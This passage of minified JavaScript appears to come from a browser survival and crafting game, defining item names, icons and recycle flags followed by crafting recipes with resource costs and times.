                        grid: 0,
                        recycle: 1
                    },
                    we[Be.PIRATE_HAT] = {
                        name: "Pirate hat",
                        img: ze.CRAFT_PIRATE_HAT,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.FLOWER_HAT] = {
                        name: "Flower hat",
                        img: ze.CRAFT_FLOWER_HAT,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.FUR_HAT] = {
                        name: "Fur hat",
                        img: ze.CRAFT_FUR_HAT,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.WOOD_HELMET] = {
                        name: "Wood helmet",
                        img: ze.CRAFT_WOOD_HELMET,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.STONE_HELMET] = {
                        name: "Stone helmet",
                        img: ze.CRAFT_STONE_HELMET,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.GOLD_HELMET] = {
                        name: "Gold helmet",
                        img: ze.CRAFT_GOLD_HELMET,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DIAMOND_HELMET] = {
                        name: "Diamond helmet",
                        img: ze.CRAFT_DIAMOND_HELMET,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.BOOK] = {
                        name: "Book",
                        img: ze.CRAFT_BOOK,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.PAPER] = {
                        name: "Paper",
                        img: ze.CRAFT_PAPER,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.BAG] = {
                        name: "Bag",
                        img: ze.CRAFT_BAG,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SWORD_AMETHYST] = {
                        name: "Amethyst sword",
                        img: ze.CRAFT_SWORD_AMETHYST,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.PICK_AMETHYST] = {
                        name: "Amethyst pick",
                        img: ze.CRAFT_PICK_AMETHYST,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.AMETHYST_SPEAR] = {
                        name: "Amethyst spear",
                        img: ze.CRAFT_AMETHYST_SPEAR,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.HAMMER] = {
                        name: "Stone hammer",
                        img: ze.CRAFT_HAMMER,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.HAMMER_GOLD] = {
                        name: "Gold hammer",
                        img: ze.CRAFT_HAMMER_GOLD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.HAMMER_DIAMOND] = {
                        name: "Diamond hammer",
                        img: ze.CRAFT_HAMMER_DIAMOND,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.HAMMER_AMETHYST] = {
                        name: "Amethyst hammer",
                        img: ze.CRAFT_HAMMER_AMETHYST,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.HAMMER_REIDITE] = {
                        name: "Reidite hammer",
                        img: ze.CRAFT_HAMMER_REIDITE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.AMETHYST_WALL] = {
                        name: "Amethyst wall",
                        img: ze.CRAFT_AMETHYST_WALL,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.AMETHYST_SPIKE] = {
                        name: "Amethyst spike",
                        img: ze.CRAFT_AMETHYST_SPIKE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.AMETHYST_DOOR] = {
                        name: "Amethyst door",
                        img: ze.CRAFT_DOOR_AMETHYST_CLOSE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.CAP_SCARF] = {
                        name: "Cap & scarf",
                        img: ze.CRAFT_CAP_SCARF,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.BLUE_CORD] = {
                        name: "Blue cord",
                        img: ze.CRAFT_BLUE_CORD,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.LOCK] = {
                        name: "Lock",
                        img: ze.CRAFT_LOCK,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.RESURRECTION] = {
                        name: "Resurrection",
                        img: ze.CRAFT_RESURRECTION,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.LOCKPICK] = {
                        name: "Lockpick",
                        img: ze.CRAFT_LOCKPICK,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.TOTEM] = {
                        name: "Totem",
                        img: ze.CRAFT_TOTEM,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.AMETHYST_HELMET] = {
                        name: "Amethyst helmet",
                        img: ze.CRAFT_AMETHYST_HELMET,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SUPER_HAMMER] = {
                        name: "Super hammer",
                        img: ze.CRAFT_SUPER_HAMMER,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.BRIDGE] = {
                        name: "Bridge",
                        img: ze.CRAFT_BRIDGE,
                        grid: 1,
                        recycle: 1
                    },
                    we[Be.WOOD_TOWER] = {
                        name: "Wood Tower",
                        img: ze.CRAFT_WOOD_TOWER,
                        grid: 1,
                        recycle: 1
                    },
                    we[Be.BOTTLE_FULL] = {
                        name: "Bottle full",
                        img: ze.CRAFT_BOTTLE_FULL,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.BOTTLE_EMPTY] = {
                        name: "Bottle empty",
                        img: ze.CRAFT_BOTTLE_EMPTY,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.SHOVEL] = {
                        name: "Stone shovel",
                        img: ze.CRAFT_SHOVEL,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.WATERING_CAN] = {
                        name: "Watering can",
                        img: ze.CRAFT_WATERING_CAN,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.WHEAT_SEED] = {
                        name: "Wheat",
                        img: ze.CRAFT_WHEAT_SEED,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.COOKIE] = {
                        name: "Cookie",
                        img: ze.CRAFT_COOKIE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.WINDMILL] = {
                        name: "Windmill",
                        img: ze.CRAFT_WINDMILL,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SUPER_DIVING_SUIT] = {
                        name: "Super diving suit",
                        img: ze.CRAFT_SUPER_DIVING_SUIT,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DIVING_MASK] = {
                        name: "Diving mask",
                        img: ze.CRAFT_DIVING_MASK,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.WATERING_CAN_FULL] = {
                        name: "Watering can full",
                        img: ze.CRAFT_WATERING_CAN_FULL,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.CAKE] = {
                        name: "Cake",
                        img: ze.CRAFT_CAKE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.FOODFISH_COOKED] = {
                        name: "Foodfish cooked",
                        img: ze.CRAFT_FOODFISH_COOKED,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.PLOT] = {
                        name: "Plot",
                        img: ze.CRAFT_PLOT,
                        grid: 1,
                        recycle: 1
                    },
                    we[Be.BREAD] = {
                        name: "Bread",
                        img: ze.CRAFT_BREAD,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.BOTTLE_FULL_2] = {
                        name: "Bottle full (with ice)",
                        img: ze.CRAFT_BOTTLE_FULL_2,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.BOTTLE_FULL_3] = {
                        name: "Bottle full (with well)",
                        img: ze.CRAFT_BOTTLE_FULL_3,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SHOVEL_GOLD] = {
                        name: "Gold shovel",
                        img: ze.CRAFT_SHOVEL_GOLD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SHOVEL_DIAMOND] = {
                        name: "Diamond shovel",
                        img: ze.CRAFT_SHOVEL_DIAMOND,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SHOVEL_AMETHYST] = {
                        name: "Amethyst shovel",
                        img: ze.CRAFT_SHOVEL_AMETHYST,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SPANNER] = {
                        name: "Spanner",
                        img: ze.CRAFT_SPANNER,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.MACHETE] = {
                        name: "Machete",
                        img: ze.CRAFT_MACHETE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.BREAD_OVEN] = {
                        name: "Bread oven",
                        img: ze.CRAFT_BREAD_OVEN,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SANDWICH] = {
                        name: "Sandwich",
                        img: ze.CRAFT_SANDWICH,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.DRAGON_HELMET] = {
                        name: "Dragon helmet",
                        img: ze.CRAFT_DRAGON_HELMET,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.LAVA_HELMET] = {
                        name: "Dragon helmet",
                        img: ze.CRAFT_LAVA_HELMET,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.WITCH] = {
                        name: "Witch",
                        img: ze.CRAFT_WITCH,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.NIMBUS] = {
                        name: "Nimbus",
                        img: ze.CRAFT_NIMBUS,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.WAND1] = {
                        name: "Wand1",
                        img: ze.CRAFT_WAND1,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.WAND2] = {
                        name: "Wand2",
                        img: ze.CRAFT_WAND2,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.DRAGON_SWORD] = {
                        name: "Dragon sword",
                        img: ze.CRAFT_DRAGON_SWORD,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.LAVA_SWORD] = {
                        name: "Dragon sword",
                        img: ze.CRAFT_LAVA_SWORD,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.WOOD_SHIELD] = {
                        name: "Wood shield",
                        img: ze.CRAFT_WOOD_SHIELD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.STONE_SHIELD] = {
                        name: "Stone shield",
                        img: ze.CRAFT_STONE_SHIELD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.GOLD_SHIELD] = {
                        name: "Gold shield",
                        img: ze.CRAFT_GOLD_SHIELD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DIAMOND_SHIELD] = {
                        name: "Diamond shield",
                        img: ze.CRAFT_DIAMOND_SHIELD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.AMETHYST_SHIELD] = {
                        name: "Amethyst shield",
                        img: ze.CRAFT_AMETHYST_SHIELD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.REIDITE_SHIELD] = {
                        name: "Reidite shield",
                        img: ze.CRAFT_REIDITE_SHIELD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.WOOD_BOW] = {
                        name: "Wood bow",
                        img: ze.CRAFT_WOOD_BOW,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.STONE_BOW] = {
                        name: "Stone bow",
                        img: ze.CRAFT_STONE_BOW,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.GOLD_BOW] = {
                        name: "Gold bow",
                        img: ze.CRAFT_GOLD_BOW,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DIAMOND_BOW] = {
                        name: "Diamond bow",
                        img: ze.CRAFT_DIAMOND_BOW,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.AMETHYST_BOW] = {
                        name: "Amethyst bow",
                        img: ze.CRAFT_AMETHYST_BOW,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.REIDITE_BOW] = {
                        name: "Reidite bow",
                        img: ze.CRAFT_REIDITE_BOW,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DRAGON_BOW] = {
                        name: "Dragon bow",
                        img: ze.CRAFT_DRAGON_BOW,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.CROWN_GREEN] = {
                        name: "Crown of life",
                        img: ze.CRAFT_CROWN_GREEN,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.GEMME_GREEN] = {
                        name: "Gem of life",
                        img: ze.INV_GEMME_GREEN,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.DRAGON_ORB] = {
                        name: "Orb of the dragon",
                        img: ze.INV_DRAGON_ORB,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.LAVA_ORB] = {
                        name: "Orb of the dragon",
                        img: ze.INV_LAVA_ORB,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.DRAGON_CUBE] = {
                        name: "Cube of the dragon",
                        img: ze.INV_DRAGON_CUBE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.LAVA_CUBE] = {
                        name: "Cube of the dragon",
                        img: ze.INV_LAVA_CUBE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.CROWN_ORANGE] = {
                        name: "Crown of luck",
                        img: ze.CRAFT_CROWN_ORANGE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.GEMME_ORANGE] = {
                        name: "Gem of luck",
                        img: ze.INV_GEMME_ORANGE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.CROWN_BLUE] = {
                        name: "Crown of the angel",
                        img: ze.CRAFT_CROWN_BLUE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.GEMME_BLUE] = {
                        name: "Gem of the angel",
                        img: ze.INV_GEMME_BLUE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.DRAGON_HEART] = {
                        name: "Dragon heart",
                        img: ze.INV_DRAGON_HEART,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.LAVA_HEART] = {
                        name: "Lava heart",
                        img: ze.INV_LAVA_HEART,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.HOOD] = {
                        name: "Hood",
                        img: ze.CRAFT_HOOD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.PEASANT] = {
                        name: "Peasant",
                        img: ze.CRAFT_PEASANT,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.WINTER_PEASANT] = {
                        name: "Winter peasant",
                        img: ze.CRAFT_WINTER_PEASANT,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.WINTER_HOOD] = {
                        name: "Winter hood",
                        img: ze.CRAFT_WINTER_HOOD,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.BUCKET_FULL] = {
                        name: "Bucket full",
                        img: ze.CRAFT_BUCKET_FULL,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.BUCKET_EMPTY] = {
                        name: "Bucket empty",
                        img: ze.CRAFT_BUCKET_EMPTY,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.WELL] = {
                        name: "Well",
                        img: ze.CRAFT_WELL,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SIGN] = {
                        name: "Sign",
                        img: ze.CRAFT_SIGN,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.PUMPKIN_SEED] = {
                        name: "Pumpkin Seed",
                        img: ze.CRAFT_PUMPKIN_SEED,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.GARLIC_SEED] = {
                        name: "Garlic Seed",
                        img: ze.CRAFT_GARLIC_SEED,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.THORNBUSH_SEED] = {
                        name: "Thorbushes Seed",
                        img: ze.CRAFT_THORNBUSH_SEED,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.ROOF] = {
                        name: "Roof",
                        img: ze.CRAFT_ROOF,
                        grid: 1,
                        recycle: 1
                    },
                    we[Be.CROWN_CRAB] = {
                        name: "Crab Crown",
                        img: ze.CRAFT_CROWN_CRAB,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.CARROT_SEED] = {
                        name: "Carrot Seed",
                        img: ze.CRAFT_CARROT_SEED,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.TOMATO_SEED] = {
                        name: "Tomato Seed",
                        img: ze.CRAFT_TOMATO_SEED,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.WATERMELON_SEED] = {
                        name: "Watermelon Seed",
                        img: ze.CRAFT_WATERMELON_SEED,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.ALOE_VERA_SEED] = {
                        name: "Aloe Vera Seed",
                        img: ze.CRAFT_ALOE_VERA_SEED,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.TURBAN1] = {
                        name: "Cap",
                        img: ze.CRAFT_TURBAN1,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.TURBAN2] = {
                        name: "Turban",
                        img: ze.CRAFT_TURBAN2,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.PILOT_HELMET] = {
                        name: "Pilot Helmet",
                        img: ze.CRAFT_PILOT_HELMET,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.EMERALD_MACHINE] = {
                        name: "Emerald Machine",
                        img: ze.CRAFT_EMERALD_MACHINE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.EXTRACTOR_MACHINE_STONE] = {
                        name: "Emerald Machine",
                        img: ze.CRAFT_EXTRACTOR_MACHINE_STONE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.EXTRACTOR_MACHINE_GOLD] = {
                        name: "Emerald Machine",
                        img: ze.CRAFT_EXTRACTOR_MACHINE_GOLD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.EXTRACTOR_MACHINE_DIAMOND] = {
                        name: "Emerald Machine",
                        img: ze.CRAFT_EXTRACTOR_MACHINE_DIAMOND,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.EXTRACTOR_MACHINE_AMETHYST] = {
                        name: "Emerald Machine",
                        img: ze.CRAFT_EXTRACTOR_MACHINE_AMETHYST,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.EXTRACTOR_MACHINE_REIDITE] = {
                        name: "Emerald Machine",
                        img: ze.CRAFT_EXTRACTOR_MACHINE_REIDITE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.PITCHFORK] = {
                        name: "Pitchfork",
                        img: ze.CRAFT_PITCHFORK,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.WOOD_DOOR_SPIKE] = {
                        name: "Wood Door Spike",
                        img: ze.CRAFT_WOOD_DOOR_SPIKE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.STONE_DOOR_SPIKE] = {
                        name: "Stone Door Spike",
                        img: ze.CRAFT_STONE_DOOR_SPIKE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.GOLD_DOOR_SPIKE] = {
                        name: "Gold Door Spike",
                        img: ze.CRAFT_GOLD_DOOR_SPIKE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DIAMOND_DOOR_SPIKE] = {
                        name: "Diamond Door Spike",
                        img: ze.CRAFT_DIAMOND_DOOR_SPIKE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.AMETHYST_DOOR_SPIKE] = {
                        name: "Amethyst Door Spike",
                        img: ze.CRAFT_AMETHYST_DOOR_SPIKE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DIAMOND_PROTECTION] = {
                        name: "Diamond Fire Protection ",
                        img: ze.CRAFT_DIAMOND_PROTECTION,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.AMETHYST_PROTECTION] = {
                        name: "Amethyst Fire Protection ",
                        img: ze.CRAFT_AMETHYST_PROTECTION,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.REIDITE_PROTECTION] = {
                        name: "Amethyst Fire Protection ",
                        img: ze.CRAFT_REIDITE_PROTECTION,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.REIDITE_SWORD] = {
                        name: "Reidite Sword",
                        img: ze.CRAFT_REIDITE_SWORD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.REIDITE_SPEAR] = {
                        name: "Reidite Spear",
                        img: ze.CRAFT_REIDITE_SPEAR,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.REIDITE_HELMET] = {
                        name: "Reidite Helmet",
                        img: ze.CRAFT_REIDITE_HELMET,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.REIDITE_DOOR_SPIKE] = {
                        name: "Reidite Door Spike",
                        img: ze.CRAFT_REIDITE_DOOR_SPIKE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.REIDITE_DOOR] = {
                        name: "Reidite Door",
                        img: ze.CRAFT_REIDITE_DOOR,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.REIDITE_SPIKE] = {
                        name: "Reidite Spike",
                        img: ze.CRAFT_REIDITE_SPIKE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.REIDITE_WALL] = {
                        name: "Reidite Wall",
                        img: ze.CRAFT_REIDITE_WALL,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.PICK_REIDITE] = {
                        name: "Reidite pick",
                        img: ze.CRAFT_PICK_REIDITE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.BOAT] = {
                        name: "Boat",
                        img: ze.CRAFT_BOAT,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SLED] = {
                        name: "Sled",
                        img: ze.CRAFT_SLED,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SADDLE] = {
                        name: "Saddle",
                        img: ze.CRAFT_SADDLE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.MOUNT_BOAR] = {
                        name: "Mount Boar",
                        img: ze.CRAFT_MOUNT_BOAR,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.CRAB_BOSS] = {
                        name: "Mount King Crab",
                        img: ze.CRAFT_CRAB_BOSS,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.BABY_DRAGON] = {
                        name: "Mount Baby Dragon",
                        img: ze.CRAFT_BABY_DRAGON,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.BABY_LAVA] = {
                        name: "Mount Baby Lava",
                        img: ze.CRAFT_BABY_LAVA,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.HAWK] = {
                        name: "Mount Hawk",
                        img: ze.CRAFT_HAWK,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.PLANE] = {
                        name: "Plane",
                        img: ze.CRAFT_PLANE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.PITCHFORK2] = {
                        name: "Pitchfork 2",
                        img: ze.CRAFT_PITCHFORK2,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.BABY_MAMMOTH] = {
                        name: "Baby Mammoth",
                        img: ze.CRAFT_BABY_MAMMOTH,
                        grid: 0,
                        recycle: 0
                    },
                    void 0)
                , Te = [{
                    r: [[Be.WOOD, 25], [Be.STONE, 5]],
                    w: 0,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.FIRE,
                    id2: Be.FIRE,
                    time: .2,
                    t: Ee
                }, {
                    r: [[Be.FIRE, 1], [Be.WOOD, 35], [Be.STONE, 10]],
                    w: 0,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.BIG_FIRE,
                    id2: Be.BIG_FIRE,
                    time: .2,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 150], [Be.STONE, 50], [Be.GOLD, 15]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.FURNACE,
                    id2: Be.FURNACE,
                    time: .05,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 20], [Be.STONE, 10]],
                    w: 0,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WORKBENCH,
                    id2: Be.WORKBENCH,
                    time: 1 / 6,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 10]],
                    w: 0,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.PICK_WOOD,
                    id2: Be.PICK_WOOD,
                    time: 1 / 3,
                    t: oe
                }, {
                    r: [[Be.PICK_WOOD, 1], [Be.WOOD, 50], [Be.STONE, 15]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.PICK,
                    id2: Be.PICK,
                    time: 1 / 8,
                    t: oe
                }, {
                    r: [[Be.WOOD, 40], [Be.GOLD, 20], [Be.STONE, 30], [Be.PICK, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.PICK_GOLD,
                    id2: Be.PICK_GOLD,
                    time: 1 / 12,
                    t: oe
                }, {
                    r: [[Be.DIAMOND, 20], [Be.GOLD, 50], [Be.STONE, 80], [Be.PICK_GOLD, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.PICK_DIAMOND,
                    id2: Be.PICK_DIAMOND,
                    time: .05,
                    t: oe
                }, {
                    r: [[Be.DIAMOND, 40], [Be.GOLD, 60], [Be.AMETHYST, 30], [Be.PICK_DIAMOND, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.PICK_AMETHYST,
                    id2: Be.PICK_AMETHYST,
                    time: 1 / 60,
                    t: oe
                }, {
                    r: [[Be.AMETHYST, 30], [Be.DIAMOND, 40], [Be.REIDITE, 30], [Be.PICK_AMETHYST, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.PICK_REIDITE,
                    id2: Be.PICK_REIDITE,
                    time: 1 / 90,
                    t: oe
                }, {
                    r: [[Be.WOOD, 90], [Be.STONE, 50]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.HAMMER,
                    id2: Be.HAMMER,
                    time: .1,
                    t: oe
                }, {
                    r: [[Be.WOOD, 160], [Be.STONE, 120], [Be.GOLD, 80], [Be.HAMMER, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.HAMMER_GOLD,
                    id2: Be.HAMMER_GOLD,
                    time: 1 / 15,
                    t: oe
                }, {
                    r: [[Be.DIAMOND, 80], [Be.STONE, 200], [Be.GOLD, 150], [Be.HAMMER_GOLD, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.HAMMER_DIAMOND,
                    id2: Be.HAMMER_DIAMOND,
                    time: .05,
                    t: oe
                }, {
                    r: [[Be.DIAMOND, 160], [Be.AMETHYST, 60], [Be.GOLD, 250], [Be.HAMMER_DIAMOND, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.HAMMER_AMETHYST,
                    id2: Be.HAMMER_AMETHYST,
                    time: 1 / 60,
                    t: oe
                }, {
                    r: [[Be.AMETHYST, 160], [Be.REIDITE, 60], [Be.DIAMOND, 250], [Be.HAMMER_AMETHYST, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.HAMMER_REIDITE,
                    id2: Be.HAMMER_REIDITE,
                    time: 1 / 90,
                    t: oe
                }, {
                    r: [[Be.HAMMER_REIDITE, 1], [Be.BOTTLE_FULL, 1], [Be.KRAKEN_SKIN, 1], [Be.SCALES, 10], [Be.AMETHYST, 20]],
                    w: 1,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.SUPER_HAMMER,
                    id2: Be.SUPER_HAMMER,
                    time: 1 / 120,
                    t: oe
                }, {
                    r: [[Be.WOOD, 30], [Be.STONE, 15]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SHOVEL,
                    id2: Be.SHOVEL,
                    time: .2,
                    t: oe
                }, {
                    r: [[Be.SHOVEL, 1], [Be.GOLD, 20], [Be.STONE, 30], [Be.WOOD, 40]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SHOVEL_GOLD,
                    id2: Be.SHOVEL_GOLD,
                    time: .1,
                    t: oe
                }, {
                    r: [[Be.SHOVEL_GOLD, 1], [Be.DIAMOND, 20], [Be.GOLD, 50], [Be.STONE, 80]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SHOVEL_DIAMOND,
                    id2: Be.SHOVEL_DIAMOND,
                    time: .05,
                    t: oe
                }, {
                    r: [[Be.SHOVEL_DIAMOND, 1], [Be.GOLD, 60], [Be.AMETHYST, 30], [Be.DIAMOND, 40]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SHOVEL_AMETHYST,
                    id2: Be.SHOVEL_AMETHYST,
                    time: .025,
                    t: oe
                }, {
                    r: [[Be.WOOD, 50]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WATERING_CAN,
                    id2: Be.WATERING_CAN,
                    time: .2,
                    t: oe
                }, {
                    r: [[Be.WATERING_CAN, 1]],
                    w: 0,
                    f: 0,
                    o: 1,
                    e: 0,
                    id: u.WATERING_CAN_FULL,
                    id2: Be.WATERING_CAN_FULL,
                    time: .2,
                    t: oe
                }, {
                    r: [[Be.WOOD, 100], [Be.STONE, 50]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.PITCHFORK,
                    id2: Be.PITCHFORK,
                    time: .1,
                    t: oe
                }, {
                    r: [[Be.PITCHFORK, 1], [Be.PITCHFORK_PART, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.PITCHFORK2,
                    id2: Be.PITCHFORK2,
                    time: 1 / 60,
                    t: oe
                }, {
                    r: [[Be.PAPER, 4], [Be.CORD, 4], [Be.FUR_WOLF, 4]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.BOOK,
                    id2: Be.BOOK,
                    time: 1 / 15,
                    t: oe
                }, {
                    r: [[Be.WOOD, 40]],
                    w: 0,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WOOD_SPEAR,
                    id2: Be.WOOD_SPEAR,
                    time: .2,
                    t: ae
                }, {
                    r: [[Be.WOOD_SPEAR, 1], [Be.WOOD, 60], [Be.STONE, 10]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SPEAR,
                    id2: Be.SPEAR,
                    time: .1,
                    t: ae
                }, {
                    r: [[Be.WOOD, 80], [Be.GOLD, 30], [Be.STONE, 30], [Be.SPEAR, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
